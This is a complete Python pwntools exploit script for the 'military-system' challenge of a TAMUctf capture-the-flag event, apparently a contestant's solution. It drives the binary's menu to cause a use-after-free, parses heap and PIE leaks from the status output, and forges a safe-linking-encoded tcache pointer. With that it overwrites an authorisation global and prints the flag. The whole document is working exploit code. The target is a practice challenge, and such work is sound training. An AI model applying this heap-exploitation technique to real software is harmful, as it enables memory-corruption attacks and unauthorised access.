#!/usr/bin/env python3

import re

from pwn import *


context.binary = elf = ELF("./military-system", checksec=False)
context.log_level = args.LOG_LEVEL or "info"

HOST = args.HOST or "streams.tamuctf.com"
PORT = int(args.PORT or 443)
SNI = args.SNI or "military-system"

DRAFT_SIZE = 0x40
CLEARANCE_VALUE = 0x00000007434F4D44


def start():
    if args.LOCAL:
        sysroot = args.SYSROOT or "/usr/aarch64-linux-gnu"
        return process(["qemu-aarch64", "-L", sysroot, elf.path])

    return remote(HOST, PORT, ssl=True, sni=SNI)


def choose(io, option):
    io.sendlineafter(b"> ", str(option).encode())


def open_channel(io, slot, label):
    choose(io, 1)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    io.sendafter(b"Callsign: ", label + b"\n")


def queue_message(io, slot, data):
    choose(io, 2)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    io.sendlineafter(b"Draft bytes (64-128): ", str(len(data)).encode())
    io.sendafter(f"Draft payload ({len(data)} bytes): ".encode(), data)


def edit_draft(io, slot, data):
    choose(io, 3)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    io.sendlineafter(b"Editor span: ", str(len(data)).encode())
    io.sendafter(f"Patch bytes ({len(data)}): ".encode(), data)


def close_channel(io, slot):
    choose(io, 4)
    io.sendlineafter(b"Slot: ", str(slot).encode())


def view_status(io, slot):
    choose(io, 5)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    return io.recvuntil(b"7. Exit\n")


def transmit(io, slot):
    choose(io, 6)
    io.sendlineafter(b"Slot: ", str(slot).encode())


def leak_state(io, slot):
    blob = view_status(io, slot)

    chunk_match = re.search(rb"last_draft=(0x[0-9a-fA-F]+)", blob)
    hook_match = re.search(rb"diagnostic_hook=(0x[0-9a-fA-F]+)", blob)
    if not chunk_match or not hook_match:
        log.failure(blob.decode("latin-1", errors="replace"))
        raise ValueError("failed to recover heap or PIE leak")

    chunk = int(chunk_match.group(1), 16)
    hook = int(hook_match.group(1), 16)
    return chunk, hook


def main():
    io = start()

    open_channel(io, 0, b"alpha")
    queue_message(io, 0, b"A" * DRAFT_SIZE)
    open_channel(io, 1, b"bravo")
    queue_message(io, 1, b"B" * DRAFT_SIZE)

    close_channel(io, 0)
    close_channel(io, 1)

    chunk_b, hook = leak_state(io, 1)

    elf.address = hook - elf.sym.render_status
    target = elf.sym.g_auth + 0x20
    encoded_target = target ^ (chunk_b >> 12)

    log.info(f"heap leak: {chunk_b:#x}")
    log.info(f"pie base:  {elf.address:#x}")
    log.info(f"target:    {target:#x}")

    edit_draft(io, 1, p64(encoded_target) + p64(0))

    open_channel(io, 1, b"reuse")
    queue_message(io, 1, b"C" * DRAFT_SIZE)

    open_channel(io, 0, b"pivot")
    queue_message(io, 0, p64(CLEARANCE_VALUE) + b"\x00" * (DRAFT_SIZE - 8))

    transmit(io, 0)
    blob = io.recvrepeat(2)
    flag = re.search(rb"[A-Za-z0-9_]+\{[^}]+\}", blob)
    if flag:
        log.success(flag.group().decode())
        return

    io.interactive(prompt="")


if __name__ == "__main__":
    main()
